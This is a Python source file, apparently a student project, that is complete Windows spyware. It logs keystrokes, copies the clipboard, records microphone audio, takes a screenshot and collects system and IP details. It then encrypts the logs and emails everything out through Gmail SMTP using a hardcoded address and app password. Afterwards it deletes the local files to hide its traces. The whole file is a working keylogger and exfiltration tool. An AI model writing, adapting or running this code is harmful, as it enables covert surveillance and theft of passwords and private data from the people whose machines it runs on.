# -- coding: utf-8 --
"""
Created on Wed Sep 14 00:48:49 2022

@author: student
"""

from pynput.keyboard import Key, Listener

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
import smtplib

import socket
import platform

import win32clipboard

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

from requests import get

from PIL import ImageGrab

email_adress = "hackclub.cs@gmail.com"
password = "kbwelcbydhtyyyxp"
to_address = "hackclub.cs@gmail.com"

keys_info = "keys_info.txt"
system_info = "systeminfo.txt"
clipboard_info = "clipboard.txt"
audio_info = "audio.wav"
screenshot_info = "screenshot.png"


if not os.path.exists('info'):
    os.makedirs('info')

dir_path = os.path.join(os.getcwd(), 'info') # Enter the file path you want your files to be saved to

files = []

def send_email(to_address):
    
    from_address = email_adress
    massage = MIMEMultipart()
    pc_name = os.environ['COMPUTERNAME']
    
    massage['From'] = from_address
    massage['To'] = to_address
    massage['Subject'] = f"Info Files from {pc_name}"
    
    body = f"This is info files from {pc_name} computer."
    massage.attach(MIMEText(body, 'plain'))
    
    for f in os.listdir("info"):
        file_path = os.path.join(dir_path, f)
        attachment = MIMEApplication(open(file_path, "rb").read(), _subtype="txt")
        attachment.add_header('Content-Disposition','attachment', filename=f)
        massage.attach(attachment)
    
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(from_address, password)
    
    text = massage.as_string()
    s.sendmail(from_address, to_address, text)
    
    s.quit()

def computer_information():
    with open(os.path.join(dir_path, system_info), "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address : " + public_ip + '\n')
        except Exception:
            f.write("Couldn't get the public IP address\n")
        f.write("Processor : " + (platform.processor()) + '\n')
        f.write("System : " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine : " + platform.machine() + '\n')
        f.write("Host Name : " + hostname + '\n')
        f.write("private IP : " + IPAddr + '\n')

computer_information()

def copy_clipboard():
    with open(os.path.join(dir_path, clipboard_info), "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data :- \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")

copy_clipboard()

microphone_record_time = 10
waited_time = 60

def microphone():
    fs = 44100
    seconds = microphone_record_time

    myrecord = sd.rec(int(seconds * fs), samplerate= fs, channels= 2)
    sd.wait()

    write(os.path.join(dir_path, audio_info), fs, myrecord)

microphone()

#screanshot information function
def screenshot():
    im = ImageGrab.grab()
    im.save(os.path.join(dir_path, screenshot_info))

screenshot()

time_iteration = 20
currentTime = time.time()
stoppingTime = time.time() + time_iteration

count = 0
keys = []

def on_press(key):
    global keys, count, currentTime
    keys.append(key)
    count+=1
    print(f"{key} pressed")
    currentTime = time.time()
    
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []
    

def write_file(keys):
    with open("info\keys_info.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("backspace") > 0:
                f.write("\\")
                f.close()
            elif k.find("enter") > 0:
                f.write("\n")
                f.close()
            elif k.find("space") > 0:
                f.write(" ")
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()
                
def on_release(key):
    if key == Key.esc:
        return False
    if currentTime > stoppingTime:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

files_to_encrypt = [os.path.join(dir_path, system_info)\
                    , os.path.join(dir_path, clipboard_info)\
                        , os.path.join(dir_path, keys_info)]

count = 0

for encrypting_file in os.listdir("info"):

    if not encrypting_file.endswith(".txt"):
        continue
    
    with open(os.path.join(dir_path, encrypting_file), 'rb') as f:
        data = f.read()

    fernet = Fernet("Xlvkqx7w0GbPEHT3VHFcXbU6uLTROKaoL2jfIqF8Evk=")
    encrypted = fernet.encrypt(data)

    with open(os.path.join(dir_path, encrypting_file), 'wb') as f:
        f.write(encrypted)

    count += 1

send_email(to_address)

time.sleep(30)

delete_files = [system_info, clipboard_info, keys_info, screenshot_info, audio_info]
for file in delete_files:
    os.remove(os.path.join(dir_path, file))
